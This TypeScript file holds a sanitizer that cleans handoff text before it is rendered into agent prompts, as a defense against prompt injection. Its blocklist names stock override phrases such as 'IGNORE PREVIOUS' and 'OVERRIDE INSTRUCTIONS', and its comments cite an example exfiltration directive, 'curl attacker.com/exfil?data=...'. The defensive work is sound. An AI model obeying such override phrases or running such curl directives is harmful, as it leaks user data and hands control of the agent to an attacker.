/**
 * Sanitization utilities for handoff content before rendering into agent prompts.
 *
 * Defense layer against prompt injection via handoff fields.
 * This is one layer of defense-in-depth — structural framing and schema
 * validation are the primary defenses. This layer strips the most common
 * injection patterns but adaptive attackers can bypass regex-based filters,
 * so it must not be treated as a sufficient defense on its own.
 */

/**
 * Sanitize a free-text handoff field value before rendering into a prompt.
 *
 * Strips patterns commonly used in prompt injection attacks:
 * - Markdown headings (could mimic system prompt sections)
 * - Horizontal rules (section separators used in prompt structure)
 * - Code fences (often contain executable instructions in attack payloads)
 * - Known instruction-override keywords
 * - URLs (exfiltration vectors: "curl attacker.com/...")
 */
export function sanitizeHandoffText(text: string): string {
  let clean = text;

  // Strip markdown headings that could mimic system sections
  clean = clean.replace(/^#{1,6}\s+/gm, "");

  // Strip horizontal rules (---, ***, ___)
  clean = clean.replace(/^[-*_]{3,}\s*$/gm, "");

  // Strip code fences — these often wrap executable payloads
  clean = clean.replace(/```[\s\S]*?```/g, "[code removed]");

  // Strip known instruction-override phrases (blocklist — not a complete defense)
  clean = clean.replace(
    /\b(SYSTEM DIRECTIVE|SYSTEM UPDATE|IGNORE PREVIOUS|OVERRIDE INSTRUCTIONS?|NEW INSTRUCTIONS?|IMPORTANT SYSTEM|END OF INSTRUCTIONS?|BEGIN INSTRUCTIONS?)\b/gi,
    "[filtered]"
  );

  // Strip URLs — prevent "curl attacker.com/exfil?data=..." style directives
  clean = clean.replace(/https?:\/\/[^\s)>\]"']+/g, "[url removed]");

  return clean.trim();
}
